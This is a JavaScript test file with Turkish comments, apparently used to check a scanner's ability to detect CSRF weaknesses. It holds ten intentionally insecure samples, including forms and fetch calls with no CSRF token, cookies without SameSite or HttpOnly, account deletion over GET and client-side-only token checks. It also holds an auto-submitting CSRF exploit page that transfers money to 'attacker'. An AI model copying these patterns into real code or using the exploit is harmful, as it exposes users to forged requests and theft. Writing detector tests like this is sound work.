/**
 * TEST SENARYOLARI: CSRF Güvenlik Açıkları Testleri
 * Bu test dosyası, CSRF güvenlik açıklarını tespit etme yeteneğini test eder.
 */

// Test 1: CSRF Token eksikliği bulunan form
function createProfileForm(userData) {
  return `
    <form action="/api/update-profile" method="POST">
      <input type="text" name="name" value="${userData.name}">
      <input type="email" name="email" value="${userData.email}">
      <button type="submit">Güncelle</button>
    </form>
  `;
}

// Test 2: CSRF Token olmayan AJAX isteği
function updateUserProfile(userId, newData) {
  // CSRF koruması içermeyen bir AJAX isteği
  fetch('/api/users/' + userId, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(newData)
  })
  .then(response => response.json())
  .then(data => console.log('Profile updated:', data));
}

// Test 3: SameSite özelliği bulunmayan cookie oluşturma
function setInsecureCookie(name, value) {
  // SameSite özelliği belirtilmemiş, HttpOnly olmayan cookie
  document.cookie = `${name}=${value}; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT`;
}

// Test 4: Yetersiz Cookie güvenlik ayarları
function setPartiallySecureCookie(name, value) {
  // Secure flag var ama SameSite=Strict yok
  document.cookie = `${name}=${value}; path=/; Secure; expires=Fri, 31 Dec 9999 23:59:59 GMT`;
}

// Test 5: GET isteği ile durum değiştirme (CSRF'e açık)
function deleteUserAccount(userId) {
  // GET ile durum değiştirme işlemi (CSRF'e açık)
  fetch(`/api/users/${userId}/delete?confirm=true`, { method: 'GET' })
    .then(response => response.json())
    .then(result => console.log('Account deletion:', result));
}

// Test 6: Auth bilgilerini içermeyen istek
function fetchUserDataInsecure(userId) {
  // Auth bilgileri olmadan istek (credentials: 'omit')
  fetch(`/api/users/${userId}`, { 
    method: 'GET',
    credentials: 'omit'
  })
  .then(response => response.json())
  .then(data => console.log('User data:', data));
}

// Test 7: Tek kullanımlık olmayan CSRF token
function setupMultipleFormsWithSameToken() {
  const csrfToken = generateToken(); // Tek bir token üretiliyor
  
  // Aynı token birden fazla formda kullanılıyor
  document.getElementById('form1').innerHTML = `
    <input type="hidden" name="csrf_token" value="${csrfToken}">
    <!-- Form içeriği -->
  `;
  
  document.getElementById('form2').innerHTML = `
    <input type="hidden" name="csrf_token" value="${csrfToken}">
    <!-- Form içeriği -->
  `;
}

// Test 8: İstemci tarafında doğrulanan CSRF token
function validateCsrfClientSide(token) {
  // Sadece istemci tarafında token doğrulama (güvensiz)
  if (token === localStorage.getItem('csrf_token')) {
    console.log('CSRF token valid');
    return true;
  }
  console.log('CSRF token invalid');
  return false;
}

// Test 9: CSRF Exploit Örneği
function createCsrfExploit() {
  return `
    <html>
      <body onload="document.forms[0].submit()">
        <form action="https://victim-site.com/api/transfer-money" method="POST">
          <input type="hidden" name="recipient" value="attacker">
          <input type="hidden" name="amount" value="1000">
        </form>
      </body>
    </html>
  `;
}

// Test 10: Yeniden gönderim koruması olmayan form
function createFormWithoutReplayProtection() {
  const csrfToken = getCurrentCsrfToken();
  
  // Süresi dolmayan token, timestamp yok
  return `
    <form action="/api/important-action" method="POST">
      <input type="hidden" name="csrf_token" value="${csrfToken}">
      <!-- Form içeriği -->
      <button type="submit">İşlemi Gerçekleştir</button>
    </form>
  `;
}